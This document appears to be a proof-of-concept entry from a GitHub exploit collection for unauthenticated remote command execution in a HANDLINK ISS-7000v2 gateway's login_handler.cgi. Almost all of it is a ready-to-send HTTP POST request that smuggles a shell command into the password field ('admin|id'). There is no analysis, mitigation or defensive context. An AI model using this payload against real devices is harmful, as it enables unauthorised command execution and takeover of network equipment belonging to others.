# HANDLINK_login_handler_rce

product: HANDLINK
from: https://github.com/wy876/POC/blob/main/%E7%80%9A%E9%9C%96%E7%A7%91%E6%8A%80%E8%82%A1%E4%BB%BD%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8/HANDLINK-ISS-7000v2%E7%BD%91%E5%85%B3login_handler.cgi%E6%9C%AA%E6%8E%88%E6%9D%83RCE%E6%BC%8F%E6%B4%9E.md

```
POST /login_handler.cgi HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
Content-Type: application/x-www-form-urlencoded
Connection: close

username=admin&password=admin|id&uilng=3&button=%E7%99%BB%E5%85%A5&Signin=
```
